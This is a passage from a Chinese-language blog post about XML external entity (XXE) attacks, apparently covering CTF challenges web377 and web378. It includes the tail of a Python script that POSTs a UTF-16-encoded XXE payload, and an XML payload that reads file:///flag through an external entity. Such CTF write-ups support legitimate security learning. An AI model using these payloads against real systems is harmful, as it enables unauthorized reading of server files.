class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = payload.encode(<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">requests.post(url, data=payload)</span><br></pre></td></tr></table></figure></p>
+<h1 id="web378">web378</h1>
+<p><img src="image.png" alt="Alt text" />
+一看就是传了一个xml，直接在DTD中包含flag即可 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/XXE/" rel="tag"># XXE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="phar反序列化">
+      <i class="fa fa-chevron-left"></i> phar反序列化
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xml"><span class="nav-number">1.</span> <span class="nav-text">XML</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E6%A1%A3%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">文档结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dtd"><span class="nav-number">1.2.</span> <span class="nav-text">DTD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E4%BD%93%E7%B1%BB%E5%88%AB%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.3.</span> <span class="nav-text">实体类别介绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dtd%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="nav-number">2.</span> <span class="nav-text">DTD实体声明</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="nav-number">2.1.</span> <span class="nav-text">内部实体声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="nav-number">2.2.</span> <span class="nav-text">外部实体声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="nav-number">2.3.</span> <span class="nav-text">参数实体声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E5%85%AC%E5%85%B1%E5%AE%9E%E4%BD%93"><span class="nav-number">2.4.</span> <span class="nav-text">引用公共实体</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">XML外部实体攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%94%84%E5%88%AB%E4%B8%80%E4%B8%AAxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">如何甄别一个XML实体攻击漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xxe%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="nav-number">4.1.</span> <span class="nav-text">XXE漏洞检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">4.2.</span> <span class="nav-text">PHP代码层面</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">5.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web373"><span class="nav-number">5.1.</span> <span class="nav-text">web373</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web374-376"><span class="nav-number">5.2.</span> <span class="nav-text">web374-376</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web377"><span class="nav-number">5.3.</span> <span class="nav-text">web377</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web378"><span class="nav-number">6.</span> <span class="nav-text">web378</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="竹云"
+      src="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
+  <p class="site-author-name" itemprop="name">竹云</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">竹云</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
